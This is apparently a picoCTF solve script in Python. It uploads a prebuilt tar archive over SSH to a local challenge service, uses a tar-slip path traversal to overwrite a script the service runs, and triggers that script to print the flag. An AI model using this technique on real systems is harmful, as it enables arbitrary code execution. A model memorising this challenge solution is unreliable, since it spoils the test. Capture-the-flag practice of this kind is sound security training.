from pwn import *
import json 
from paramiko import SSHClient
from scp import SCPClient

def main():
    args = sys.argv[1:]
    # Load JSON file into dictionary
    # data = json.loads(open("metadata.json").read())

    # taken from: https://github.com/jbardin/scp.py
    # copy over the tar file
    ssh1 = SSHClient()
    ssh1.load_system_host_keys()
    ssh1.connect(hostname='localhost', 
                port = int(args[0]),
                username='ctf-player',
                password=args[1])


    # SCPCLient takes a paramiko transport as its only argument
    scp = SCPClient(ssh1.get_transport())

    scp.put('jfs.tar', '/home/ctf-player/downloads/')

    scp.close()
    ssh1.close()

    # Connect to SSH server
    s1 = ssh("ctf-player", port=int(args[0]), password=args[1])
    r1 = s1.remote('localhost', 5556)
    
    # skip 2 lines
    tmp = r1.recvline()
    tmp = r1.recvline()
    # tar is prebuilt with the following 
    # tar -cvf jfs.tar ../joey_file_system_exec/get_file_info.sh
    # where exploit.sh in this repo renamed -> get_file_info.sh

    # copy the files over
    # s1.upload("jfs.tar", "downloads/")
    # Send payload to do tar slip into the folder with executing script
    r1.sendline(b"upload_files jfs.tar")
    
    # skip output
    tmp = r1.recvline()
    tmp = r1.recvline()
    tmp = r1.recvline()
    tmp = r1.recvline()

    # run get_file_info to trigger our overwritten script to cat flag
    r1.sendline(b"get_file_info")
    
    flag = r1.recvline().decode()
    flag = flag[flag.find("picoCTF"):].strip().strip("\n")
    print(flag)
    # Write flag to file
    with open("flag", "w") as w:
        w.write(flag)

if __name__ == "__main__":
    main()